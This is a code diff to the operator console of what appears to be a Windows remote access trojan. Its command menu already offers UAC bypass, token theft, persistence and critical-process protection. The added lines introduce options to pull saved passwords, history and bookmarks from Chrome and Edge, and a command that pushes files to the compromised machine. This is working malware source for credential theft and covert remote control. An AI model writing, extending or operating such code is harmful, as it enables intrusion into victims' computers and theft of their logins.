@@ -27,6 +27,7 @@ commands = {'help': ['Show this help'],
             'bypassuac': ['Elevate as administrator without UAC prompt'],
             'stealtoken': ['Duplicate access token from a running process'],
             'persistence': ['Run automatically at startup'],
+            'browser': ['Extract data from web browser'],
             'poweroff': ['Fast shutdown'],
             'setcritical': ['Set as critical process']
             }
@@ -187,9 +188,21 @@ class Server(object):
                     select(conn, ['persistence_registry', 'persistence_schtasks', 'persistence_service'])
                 elif cmd == 'stealtoken':
                     select(conn, ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin'])
+                elif cmd == 'browser':
+                    select(conn,
+                           ['chrome_bookmark', 'chrome_history', 'chrome_password', 'edge_bookmark', 'edge_history',
+                            'edge_password'])
                 elif cmd == 'poweroff':
                     send(conn, cmd)
                     break
+                elif cmd.split(' ')[0] == 'fsdownload':
+                    filename = cmd.split(' ')[1].strip()
+                    if not os.path.isfile('uploads' + os.sep + filename):
+                        send(conn, 'null')
+                        print('[-] File not found')
+                        continue
+                    send(conn, 'fsdownload ' + os.path.basename(filename))
+                    print(recv(conn))
                 else:
                     send(conn, cmd)
                     print(recv_data(conn))
